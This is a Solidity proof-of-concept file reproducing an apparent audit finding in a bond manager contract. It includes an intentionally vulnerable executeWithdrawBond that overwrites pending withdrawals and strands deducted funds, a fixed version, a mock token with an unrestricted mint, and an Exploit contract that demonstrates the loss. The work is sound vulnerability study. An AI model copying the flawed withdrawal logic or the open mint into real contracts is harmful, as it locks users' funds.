// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// Pheasant BondManager (Quantstamp). executeWithdrawBond deducts bonds and
// overwrites the single pending withdrawal. A second request drops the first
// amount: it is subtracted from bonds and never paid. Report figures, in 1e18
// units: deposit 1000, requests 100 then 300, finalize pays 300, 100 stays stuck.
// UPDATE_PERIOD is 0 so finalize fits in this transaction. The wait is not the bug.
// Any depositor can call these functions. There is no admin.

contract BondToken {
    string public symbol = "BOND";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract BondManager {
    struct Withdrawal {
        uint256 timestamp;
        uint256 tokenId;
        uint256 amount;
    }

    BondToken public immutable token;
    mapping(uint256 => uint256) public bonds;
    mapping(address => Withdrawal) public bondWithdrawal;

    constructor(BondToken _token) {
        token = _token;
    }

    function deposit(uint256 tokenId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        bonds[tokenId] += amount;
    }

    function executeWithdrawBond(uint256 tokenId, uint256 amount) external {
        bonds[tokenId] -= amount;
        bondWithdrawal[msg.sender] = Withdrawal(block.timestamp, tokenId, amount); // @> VULN: overwrites the pending withdrawal; the earlier amount stays deducted and is never paid
    }

    function finalizeWithdrawalBond() external {
        Withdrawal memory w = bondWithdrawal[msg.sender];
        require(w.amount != 0, "none");
        delete bondWithdrawal[msg.sender];
        token.transfer(msg.sender, w.amount);
    }
}

contract BondManagerFixed {
    struct Withdrawal {
        uint256 timestamp;
        uint256 tokenId;
        uint256 amount;
    }

    BondToken public immutable token;
    mapping(uint256 => uint256) public bonds;
    mapping(address => Withdrawal) public bondWithdrawal;

    constructor(BondToken _token) {
        token = _token;
    }

    function deposit(uint256 tokenId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        bonds[tokenId] += amount;
    }

    function executeWithdrawBond(uint256 tokenId, uint256 amount) external {
        require(bondWithdrawal[msg.sender].amount == 0, "pending");
        bonds[tokenId] -= amount;
        bondWithdrawal[msg.sender] = Withdrawal(block.timestamp, tokenId, amount);
    }

    function finalizeWithdrawalBond() external {
        Withdrawal memory w = bondWithdrawal[msg.sender];
        require(w.amount != 0, "none");
        delete bondWithdrawal[msg.sender];
        token.transfer(msg.sender, w.amount);
    }
}

contract StuckMarker {
    string public symbol = "STUCK-BOND";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant START = 1000 ether;
    uint256 public constant FIRST = 100 ether;
    uint256 public constant SECOND = 300 ether;
    uint256 public constant LOST = 100 ether;

    BondToken public token;
    BondManager public mgr;
    StuckMarker public marker;

    function run() external payable {
        token = new BondToken();
        mgr = new BondManager(token);
        marker = new StuckMarker();
        token.mint(address(this), START);
        token.approve(address(mgr), START);
        mgr.deposit(1, START);
        mgr.executeWithdrawBond(1, FIRST);
        require(mgr.bonds(1) == START - FIRST, "after first");
        mgr.executeWithdrawBond(1, SECOND);
        require(mgr.bonds(1) == START - FIRST - SECOND, "after second");
        mgr.finalizeWithdrawalBond();
        require(token.balanceOf(address(this)) == SECOND, "paid");
        uint256 stuck = token.balanceOf(address(mgr)) - mgr.bonds(1);
        require(stuck == LOST, "stuck");
        marker.mint(SINK, stuck);
    }
}
